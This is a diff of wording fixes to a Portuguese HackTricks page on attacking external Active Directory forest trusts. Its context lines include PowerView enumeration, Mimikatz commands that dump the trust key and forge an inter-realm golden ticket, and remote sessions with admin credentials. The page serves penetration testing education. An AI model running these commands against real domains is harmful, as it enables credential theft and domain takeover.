@@ -75,7 +75,7 @@ Na enumeração anterior, foi descoberto que o usuário **`crossuser`** está de
 
 Se você **não conseguiu** encontrar nenhum acesso **especial** do seu usuário no outro domínio, você ainda pode voltar à Metodologia AD e tentar **privesc de um usuário não privilegiado** (coisas como kerberoasting, por exemplo):
 
-Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain` como em:
+Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain`, como em:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -91,7 +91,7 @@ Usando um método regular com as credenciais dos usuários que têm acesso ao do
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### Abuso do SID History
+### Abuso de SID History
 
 Você também pode abusar do [**SID History**](sid-history-injection.md) através de uma confiança de floresta.
 
@@ -104,7 +104,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Você poderia **assinar com** a chave **confiável** um **TGT de personificação** do usuário do domínio atual.
+Você poderia **assinar com** a **chave confiável** um **TGT se passando** pelo usuário do domínio atual.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -135,11 +135,11 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Suporte ao HackTricks</summary>
+<summary>Supporte o HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
